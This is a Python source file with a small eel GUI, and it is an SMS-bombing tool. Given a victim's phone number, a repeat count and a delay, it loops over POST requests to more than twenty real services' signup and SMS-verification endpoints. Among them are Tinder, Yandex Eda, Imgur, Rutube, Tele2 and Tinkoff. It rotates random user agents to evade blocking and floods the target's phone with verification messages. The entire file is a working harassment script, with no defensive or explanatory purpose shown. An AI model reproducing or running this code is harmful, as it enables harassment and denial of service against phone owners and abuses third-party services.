import eel
import requests
import time
from os import system
from user_agent import generate_user_agent
eel.init("web")

headers = {"User-Agent": generate_user_agent()}

@eel.expose
def smstart(number, cycle, delay):
	cycle1 = int(cycle)
	delay1 = int(delay)
	number1 =int(number) 
	for i in range(cycle1):
		headers = {"User-Agent": generate_user_agent()}

		a = requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={"phone_number": number1}, headers=headers)

		#print(a)

		time.sleep(delay1)


		b = requests.post("https://bamper.by/registration/?step=1", data={"phone": "+" + str(number1), "submit": "Запросить смс подтверждения", "rules": "on"}, headers=headers)

		#print(b)

		time.sleep(delay1)


		c = requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": number1}, headers=headers)

		#print(c)

		time.sleep(delay1)

		d = requests.post("https://eda.yandex/api/v1/user/request_authentication_code", headers=headers, json={"phone_number": "+" + str(number1)})

		#print(d)

		time.sleep(delay1)

		e = requests.post("https://api.iconjob.co/api/auth/verification_code", json={"phone": number1}, headers=headers)

		#print(e)

		time.sleep(delay1)

		g = requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": number1}, headers=headers)

		#print(g)

		time.sleep(delay1)

		h = requests.post("https://api.imgur.com/account/v1/phones/verify", json={"phone_number": number1, "region_code": "RU"}, headers=headers)

		#print(h)

		time.sleep(delay1)

		k = requests.post("https://thehive.pro/auth/signup", json={"phone": "+" + str(number1)}, headers=headers)

		#print(k)

		time.sleep(delay1)

		j = requests.post("https://client-api.sushi-master.ru/api/v1/auth/init", json={"phone": number1}, headers=headers)
		#print(j)

		l = requests.post("https://api.sunlight.net/v3/customers/authorization/", data={"phone": number1}, headers=headers)

		#print(l)

		time.sleep(delay1)

		m = requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/", json={"phone": "+" + str(number1)}, headers=headers)

		#print(m)

		n = requests.post("https://rieltor.ua/api/users/register-sms/", json={"phone": number1, "retry": 0}, headers=headers)

		#print(n)

		time.sleep(delay1)

		x = requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": number1}, headers=headers)

		#print(x)

		time.sleep(delay1)

		z = requests.post("https://account.my.games/signup_send_sms/", data={"phone": number1}, headers=headers)

		#print(z)

		time.sleep(delay1)

		sm1 = requests.post("https://www.citilink.ru/registration/confirm/phone/+" + str(number1) + "/")

		time.sleep(delay1)

		sm2 = requests.post("https://pampik.com/callback", data={"phoneCallback": number1}, headers=headers)

		time.sleep(delay1)

		sm3 = requests.post("https://auth.multiplex.ua/login", data={"login": number1}, headers=headers)

		time.sleep(delay1)

		sm4 = requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": number1}, headers=headers)

		time.sleep(delay1)

		sm5 = requests.post("https://msk.tele2.ru/api/validation/number/" + str(number1) + "/", json={'sender': number1}, headers=headers)

		time.sleep(delay1)

		sm6 = requests.post("https://pay.visa.ru/api/Auth/code/request", data={'phoneNumber': number1}, headers=headers)

		time.sleep(delay1)

		sm7 = requests.post("https://api.tinkoff.ru/v1/sign_up", data={'phone': number1}, headers=headers)

		time.sleep(delay1)

				

eel.start('main.html', size=(600, 600), port=500)